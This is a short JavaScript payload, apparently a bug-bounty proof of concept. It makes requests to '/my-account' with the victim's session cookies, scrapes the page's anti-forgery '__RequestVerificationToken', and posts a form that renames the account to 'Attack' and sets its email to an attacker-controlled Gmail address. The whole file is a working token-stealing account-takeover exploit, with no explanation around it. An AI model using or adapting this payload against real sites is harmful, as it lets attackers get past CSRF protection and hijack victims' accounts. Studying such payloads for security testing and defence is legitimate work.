var req1 = new XMLHttpRequest();
req1.onload = req1Listener;
req1.open('get', '/my-account', true);
req1.withCredentials = true;
req1.send('{}');
function req1Listener() {
document.write(this.responseText);
};

req1.onreadystatechange = function()
{
    if (req1.readyState == 4 && req1.status == 200)
    {
        var req2 = new XMLHttpRequest();
        req2.onload = handleResponse;
        req2.open('get','/my-account',true);
        req2.send();
        function handleResponse() {
        var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
        var changeEmail = new XMLHttpRequest();
        changeEmail.open('post', '/my-account/', true);
        changeEmail.send('__RequestVerificationToken='+token+'&NameInput=Attack&EmailAddressInput=attacker.wearehackerone%40gmail.com&ReasonInput=&PreferNotToSay=true&PreferNotToSay=false&ufprt=FB0A18C231FCD925AE09FEF07375F9F54CDC96977CBDAEE1BA10CFAF9C131430D1547EC5B98B7F86FD44D85CD3FC942991CC63991FA8A0915CC26A3D0A0068E06962BA27804AC9BD44D01E5A7384C787AC5FC4EFD6948C96981514F71B55A0C122A1CFA12842C57633988EF9EBEFD23CAEFF74D096868CA2190A25544D9BC8CC362D42EC047D443CADE300C518AC40C0C73E35DC5C3AD24979833760C0BCC28FF75B7AE886580B3325CF2223A75B58ED38201FA7ED227984940D052C25E502F4DDF7838B')
        };
    }
}
